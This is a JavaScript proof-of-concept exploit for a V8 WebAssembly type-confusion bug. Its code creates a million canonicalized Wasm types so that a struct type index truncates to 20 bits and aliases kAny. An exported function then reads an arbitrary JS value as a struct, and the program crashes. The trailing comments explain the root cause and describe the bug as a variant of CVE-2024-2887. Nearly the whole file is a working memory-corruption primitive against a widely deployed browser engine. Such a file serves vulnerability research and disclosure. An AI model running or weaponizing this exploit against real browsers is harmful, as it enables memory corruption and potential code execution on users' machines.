// poc.js
// kNumberOfPredefinedTypes = 2

// stack up 1000000 more canonicalized types (total 1000002)
{
  const builder = new WasmModuleBuilder();
  builder.startRecGroup();
  for (let i = 0; i < 1000000; i++) {
    builder.addArray(kWasmI64);
  }
  builder.endRecGroup();
  builder.instantiate();
}

// confuse argument as struct (mut i32) by aliasing canonicalized type with kAny
{
  let builder = new WasmModuleBuilder();
  builder.startRecGroup();
  builder.addArray(kWasmI64); // 1000002
  builder.addArray(kWasmI64); // 1000003
  builder.addArray(kWasmI64); // 1000004
  let struct = builder.addStruct([makeField(kWasmI32, true)]); // 1000005 <- kAny
  let funcSig = builder.addType(makeSig([wasmRefType(struct)], [kWasmI32])); // 1000006
  builder.endRecGroup();
  builder
    .addFunction("read", funcSig)
    .addBody([
      kExprLocalGet,
      0,
      kGCPrefix,
      kExprStructGet,
      struct,
      ...wasmUnsignedLeb(0),
    ])
    .exportFunc();
  const instance = builder.instantiate();
  const wasm = instance.exports;

  // this should obviously fail, instead of reading from the given JS object (or smi)
  // instead we segfault on the smi as caged offset
  console.log(wasm.read(0).toString(16));
}

// FromJS / WasmJSToWasmObject is mistaking canonicalized type indexes as normal type indexes.
// This confusion also results in the value to be truncated to 20bits (= 0x100000 = 1048576) since
//  ValueType is used to represent the type indexes, so we can even cycle back to 0 and create more
//  types that are confused as kAny.
// => Arbitrary WASM type confusion, variant of @_manfp's CVE-2024-2887 at Pwn2Own Vancouver 2024
